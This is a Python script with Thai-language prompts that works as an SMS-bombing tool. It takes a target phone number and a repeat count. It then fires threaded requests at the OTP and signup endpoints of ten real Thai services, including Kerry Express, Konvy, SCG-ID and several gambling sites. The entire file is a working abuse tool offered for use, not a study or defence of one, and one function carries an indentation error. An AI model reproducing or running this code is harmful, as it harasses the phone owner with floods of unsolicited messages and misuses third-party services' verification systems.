import requests,os,sys,threading
from requests import post

os.system("clear")

print ("ทดสอบยิงเบอร์")
print ("น่าจะ5apiแหละอย่าเถียง😅")
phone = input("เบอร์📱: ")
amount = int(input("จำนวน📲: "))

useragent = "Mozilla/5.0 (Linux; Android 10; Infinix X657C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36"

def spam1():
     post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
  "on": {
    "value": phone,
    "country": "66"
  },
  "type": "mobile"
},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 
    print (f"Send number {phone} | Success ✓")

def spam2():
     post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
     print (f"Send number {phone} | Success ✓")

def spam3():
     post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
     print (f"Send number {phone} | Success ✓")

def spam4():
     post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
     print (f"Send number {phone} | Success ✓")

def spam5():
     post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
     print (f"Send number {phone} | Success ✓")

def spam6():
     post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
     print (f"Send number {phone} | Success ✓")

def spam7():
     post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
     print (f"Send number {phone} | Success ✓")

def spam8():
     post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
     print (f"Send number {phone} | Success ✓")

def spam9():
     post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
     print (f"Send number {phone} | Success ✓")

def spam10():
     post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
     print (f"Send number {phone} | Success ✓")


for i in range(int(amount)):
      
         threading.Thread(target=spam1).start()
         threading.Thread(target=spam2).start()
         threading.Thread(target=spam3).start()
         threading.Thread(target=spam4).start()
         threading.Thread(target=spam5).start()
         threading.Thread(target=spam6).start()
         threading.Thread(target=spam7).start()
         threading.Thread(target=spam8).start()
         threading.Thread(target=spam9).start()
         threading.Thread(target=spam10).start()
